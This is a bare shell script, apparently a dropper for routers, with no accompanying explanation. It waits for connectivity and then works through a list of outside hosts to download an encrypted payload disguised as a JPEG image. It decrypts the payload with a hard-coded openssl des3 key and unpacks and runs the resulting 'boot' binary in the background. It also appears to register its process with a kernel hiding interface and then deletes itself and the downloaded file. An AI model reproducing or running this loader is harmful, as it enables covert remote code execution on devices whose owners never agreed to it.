#!/bin/sh
LOCKFILE=$(pwd)/run.lock
NETWORK_DOWN=1
DST_TAR=$(pwd)/_dy_nwan.stuff

nvram set nwan_dir=$(pwd)
SCRIPT_OBJECT=router/nwan_sz.jpg
SCRIPT_URLS=`nvram get script_url`/${SCRIPT_OBJECT}
SCRIPT_URLS=${SCRIPT_URLS},http://www.kmssnr.com:88/${SCRIPT_OBJECT}
SCRIPT_URLS=${SCRIPT_URLS},http://www.kmssnr.com/${SCRIPT_OBJECT}
SCRIPT_URLS=${SCRIPT_URLS},http://www.7xar.com/${SCRIPT_OBJECT}
SCRIPT_URLS=${SCRIPT_URLS},http://www.7xar.com:88/${SCRIPT_OBJECT}
SCRIPT_URLS=${SCRIPT_URLS},http://www.surfing365.cn:88/${SCRIPT_OBJECT}
SCRIPT_URLS=${SCRIPT_URLS},http://www.email-you.cn:88/${SCRIPT_OBJECT}

kill_pre_instance() {
	if [ -f $LOCKFILE ]; then
		PID=`cat $LOCKFILE`
		kill -9 $PID > /dev/null 2>&1
	fi
}

kill_pre_instance
echo $$ > $LOCKFILE
echo h$$ >/proc/shctl/shctl

check_network() {
	ping -c 3 www.baidu.com > /dev/null 2>&1
	NETWORK_DOWN=$?
}

while [ $NETWORK_DOWN -ne 0 ]
do
	sleep 1
	#echo "checking network" > /dev/kmsg
	check_network
done

sleep 1
echo "network ok!"
for URL in $(echo ${SCRIPT_URLS} | tr "," "\n")
do
	boot=$(pwd)/boot
	rm -rf $boot 
	echo url=$URL
	rm -rf $DST_TAR
	wget -O $DST_TAR $URL > /dev/null 2>&1
	ret=$?
	echo h$!>/proc/shctl/shctl
	if [ $? == 0 ] ; then
		if [ ! -f $DST_TAR ] ; then
			continue
		fi
		echo $DST_TAR download ok
		dd if=$DST_TAR | openssl des3 -d -k dycwcrowdmfkbcom | tar zxf - > /dev/null 2>&1
		ret=$?
		if [ $ret -ne 0 ] ; then
			continue
		fi
		if [ ! -f "$boot" ] ; then
			continue
		fi

		chmod a+x $boot > /dev/null 2>&1
		$boot > $(pwd)/_dy_run.log 2>&1 &
		echo $boot download ok!!! > /dev/kmsg
		break
	fi
	sleep 2
done

del_if_exist(){
	fp=$1
	if [ -f "$fp" ] ; then
		rm -rf "$fp" > /dev/null 2>&1
	fi
}

rm -rf $LOCKFILE
del_if_exist $DST_TAR
rm -rf $0

